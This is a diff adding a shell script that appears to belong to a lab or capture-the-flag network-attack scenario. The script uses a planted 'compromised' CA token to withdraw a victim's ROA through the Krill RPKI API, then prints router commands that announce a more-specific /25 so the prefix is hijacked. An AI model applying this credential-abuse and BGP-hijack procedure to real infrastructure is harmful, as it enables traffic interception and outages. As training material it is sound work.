@@ -1,0 +1,50 @@
+#!/bin/sh
+# poison - the ROA-poisoning arming step, performed by the player.
+#
+# Withdraw FDEI's ROA from FMDA's RPKI CA, using the CA token found on this box
+# (/loot/krill-token, planted as the abstracted compromised credential). This is a
+# real call to Krill's API over the regpub segment, not a ctl knob. With the /24
+# ROA gone, the attacker's /25 goes from RPKI-invalid to not-found, so origin
+# validation no longer drops it.
+set -e
+
+CA_API="https://fmda-ca.lab:3000/api/v1/cas/fmda/routes"
+TOK_FILE="/loot/krill-token"
+# FDEI's ROA: 203.0.113.0/24, max-length 24, origin AS65010.
+ROA='{"asn":65010,"prefix":"203.0.113.0/24","max_length":24}'
+
+if [ ! -f "$TOK_FILE" ]; then
+    echo "poison: no CA credential on this box ($TOK_FILE absent)."
+    echo "        this is the wrong foothold for that move, or the scenario is not armed."
+    exit 1
+fi
+TOK=$(cat "$TOK_FILE")
+
+echo "poison: withdrawing FDEI's ROA (203.0.113.0/24 => 65010) from FMDA's CA ..."
+# Krill serves a self-signed cert (FMDA Lab Root); -k is the attacker's pragmatic move.
+CODE=$(curl -sk -m10 -o /dev/null -w '%{http_code}' -X POST "$CA_API" \
+  -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
+  -d "{\"added\":[],\"removed\":[$ROA]}")
+
+if [ "$CODE" = "200" ]; then
+    echo "poison: ROA withdrawn. Routinator will drop the VRP on its next refresh."
+else
+    echo "poison: withdraw failed (HTTP $CODE)."
+    exit 1
+fi
+
+cat <<MSG
+
+Next: once the VRP clears, the /25 validates as not-found instead of invalid, so
+ROV stops dropping it. Pivot to the foothold and announce it:
+
+    foothold
+    # in the foothold's vtysh (the discard static puts the prefix in the RIB so
+    # the network statement will originate it):
+    #   configure terminal
+    #   ip route 203.0.113.0/25 Null0
+    #   router bgp 65020
+    #   address-family ipv4 unicast
+    #   network 203.0.113.0/25
+    #   end
+MSG
